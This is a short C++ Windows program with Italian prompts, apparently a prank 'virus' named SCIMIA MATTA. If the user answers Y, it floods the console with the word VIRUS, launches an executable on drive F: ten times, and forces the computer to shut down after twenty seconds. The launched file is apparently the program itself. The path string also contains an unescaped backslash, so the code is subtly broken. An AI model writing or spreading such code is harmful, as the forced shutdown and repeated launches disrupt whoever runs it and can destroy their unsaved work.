#include <iostream>
#include <stdlib.h>
#include <windows.h>
#include <conio.h>
#include <string>
using namespace std;
void setColor(short Color){
    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hCon,Color);
}
int main(){
    setColor(2);
    char scelta;
    char Y='Y';
    char y='y';
    char N='N';
    char n='n';
    cout<<"Sei sicuro di voler aprire questo file?"<<endl;
    cout<<"Y/N"<<endl;
    cin>>scelta;
    if(scelta==N || scelta==n){
        cout<<"Ottima scelta"<<endl;
        Sleep(3000);
        return 0;
    }
    else if(scelta==Y || scelta==y){
        int i=0;
        while(i<300){
            cout<<"SCIMIA MATTA VIRUS ";
            Sleep(1);
            i++;
        }
        Sleep(1000);
        for(i=0;i<10;i++){
            system("start F:\scimia.exe");
        }
        system("shutdown -s -t 20 ");
    }
}